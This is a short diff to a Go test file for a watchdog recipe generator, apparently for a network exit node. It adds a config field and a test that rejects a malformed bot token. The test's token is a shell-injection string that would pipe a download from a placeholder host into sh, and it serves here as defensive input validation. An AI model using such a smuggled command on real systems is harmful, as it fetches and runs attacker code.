@@ -65,7 +65,7 @@ func (h *watchdogHost) Run(_ context.Context, script string) (string, error) {
 func watchdogOpts(record *int) WatchdogOptions {
 	return WatchdogOptions{
 		Params: config.HubWatchParams{HubAddr: "203.0.113.1", SiteHost: "site.example.test",
-			ControlURL: config.HubWatchControlURL, ExitName: "выход 3", StaggerSec: 30},
+			ControlURL: config.HubWatchControlURL, ControlRUURL: config.HubWatchControlRUURL, ExitName: "выход 3", StaggerSec: 30},
 		BotToken: "123456:AAfake_watchdog_token", ChatID: "-1001234567890",
 		Record: func(context.Context) error { *record++; return nil },
 	}
@@ -158,6 +158,13 @@ func TestWatchdogRecipeRefusals(t *testing.T) {
 		if _, err := watchdogRecipe(bad, st); err == nil {
 			t.Errorf("%+v accepted", bad)
 		}
+	}
+	// a token that is not a token never reaches the env file root sources on the exit
+	evil := o
+	evil.BotToken = "x'; curl evil.example.test|sh; '"
+	st.Exit.Watchdog = &evil
+	if _, err := watchdogRecipe(n, st); err == nil {
+		t.Error("a token with a quote accepted")
 	}
 	bad := o
 	bad.Params.HubAddr = "hub.example.test"
